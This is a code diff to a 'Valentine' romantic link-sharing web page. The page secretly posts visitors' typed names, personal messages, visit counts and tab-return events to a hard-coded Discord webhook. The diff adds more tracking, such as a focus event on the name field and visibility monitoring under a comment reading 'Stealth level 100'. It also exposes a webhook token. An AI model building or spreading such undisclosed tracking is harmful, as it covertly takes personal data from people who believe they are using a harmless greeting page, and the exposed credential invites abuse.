@@ -59,7 +59,7 @@
     <div class="glass-box">
       <h1 id="introText" style="color: white; font-weight: 800;">My heart is locked.</h1>
       <p id="customText" style="color:white; margin-bottom:20px; font-style: italic; font-size: 0.95rem; opacity: 0; transition: opacity 2s ease;"></p>
-      <input type="text" id="userName" style="padding: 15px; border-radius: 50px; border: none; width: 80%; text-align: center;" placeholder="Your name..." onkeydown="if(event.key==='Enter') startApp()">
+      <input type="text" id="userName" style="padding: 15px; border-radius: 50px; border: none; width: 80%; text-align: center;" placeholder="Your name..." onfocus="trackEvent('Started Typing Name...')" onkeydown="if(event.key==='Enter') startApp()">
       <button onclick="startApp()" style="background: var(--primary); color: white; border: none; padding: 15px 40px; border-radius: 50px; font-weight: 800; cursor: pointer; margin-top: 20px;">Unlock My Heart</button>
       <p style="color:white; font-size:0.75rem; margin-top:20px; opacity:0.8; cursor:pointer; text-decoration: underline;" onclick="openModal()">Create your own link</p>
     </div>
@@ -74,8 +74,10 @@
 
 <script>
   let visitorName = "", clickCount = 0, yesScale = 1, generatedUrl = "";
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1468954384997023777/oL5KyCiivYCBUM3gI0_JWhkKiBV8t6ngFZjZbanUQ_XMUc2E2oWU1_OZw4u0eFfnax7A";
+  let views = parseInt(localStorage.getItem('v_views') || "0") + 1;
+  localStorage.setItem('v_views', views);
 
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1468954384997023777/oL5KyCiivYCBUM3gI0_JWhkKiBV8t6ngFZjZbanUQ_XMUc2E2oWU1_OZw4u0eFfnax7A";
   const params = new URLSearchParams(window.location.search);
   let sharedBy = params.get('from'), customMsg = params.get('msg');
 
@@ -84,10 +86,21 @@
     if(customMsg) {
       const msgEl = document.getElementById('customText');
       msgEl.innerText = `"${decodeURIComponent(customMsg)}"`;
-      setTimeout(() => { msgEl.style.opacity = "1"; }, 500); // Romantic fade-in
+      setTimeout(() => { msgEl.style.opacity = "1"; }, 500);
     }
-    trackEvent(sharedBy ? `Opened (From ${sharedBy})` : "Opened Direct");
+    trackEvent(`Page Opened (Visit #${views})`);
   };
+
+  // Visibility tracking (Stealth level 100)
+  document.addEventListener("visibilitychange", () => {
+    if (document.visibilityState === 'visible') trackEvent("User returned to tab");
+  });
+
+  function trackEvent(event) {
+    let report = `🔄 **Valentine Update**\n**User:** ${visitorName || "Guest"}\n**Event:** ${event}\n**Visit Count:** ${views}`;
+    if (customMsg) report += `\n**Reading Message:** "${decodeURIComponent(customMsg)}"`;
+    fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: report }) });
+  }
 
   function updateSuggestions() {
     const from = document.getElementById('creatorInput').value.trim() || "Me";
@@ -105,8 +118,7 @@
       `To ${to}: You've stolen ${from}'s heart!`
     ];
     const select = document.getElementById('suggestionBox');
-    select.innerHTML = '<option value="">✨ Suggested Messages...</option>' + 
-      suggestions.map(s => `<option value="${s}">${s}</option>`).join('');
+    select.innerHTML = '<option value="">✨ Suggested Messages...</option>' + suggestions.map(s => `<option value="${s}">${s}</option>`).join('');
   }
 
   function selectSuggestion() { document.getElementById('msgInput').value = document.getElementById('suggestionBox').value; }
@@ -117,20 +129,11 @@
     const creator = document.getElementById('creatorInput').value.trim();
     const target = document.getElementById('targetInput').value.trim();
     const msg = document.getElementById('msgInput').value.trim();
-    if (!creator || !target) return alert("Please enter both names!");
-    
+    if (!creator || !target) return alert("Please enter names!");
     const base = window.location.href.split('?')[0];
     generatedUrl = `${base}?from=${encodeURIComponent(creator)}&to=${encodeURIComponent(target)}&msg=${encodeURIComponent(msg)}`;
     
-    // Log the link generation and the custom message to Discord
-    fetch(WEBHOOK_URL, { 
-      method: 'POST', 
-      headers: {'Content-Type': 'application/json'}, 
-      body: JSON.stringify({ 
-        content: `🚀 **New Viral Link Created!**\n**By:** ${creator}\n**For:** ${target}\n**Message:** "${msg || "None"}"\n**URL:** ${generatedUrl}` 
-      }) 
-    });
-
+    fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: `🚀 **New Link!**\n**By:** ${creator}\n**For:** ${target}\n**Message:** "${msg}"` }) });
     document.getElementById('step1').style.display = 'none';
     document.getElementById('step2').style.display = 'block';
     document.getElementById('displayTarget').innerText = target;
@@ -164,13 +167,6 @@
     trackEvent("SAID YES! ❤️");
     confetti({ particleCount: 150, spread: 70 });
     document.getElementById("mainCard").innerHTML = `<h1 style="color:var(--primary)">SUCCESS! ❤️</h1><button class="primary-btn" onclick="openModal()" style="width: auto; padding: 10px 30px;">Create Your Own</button>`;
-  }
-
-  function trackEvent(event) {
-    let report = `🔄 **Valentine Update**\n**User:** ${visitorName || "Guest"}\n**Event:** ${event}`;
-    if (customMsg) report += `\n**Reading Message:** "${decodeURIComponent(customMsg)}"`;
-    
-    fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: report }) });
   }
 </script>
 </body>
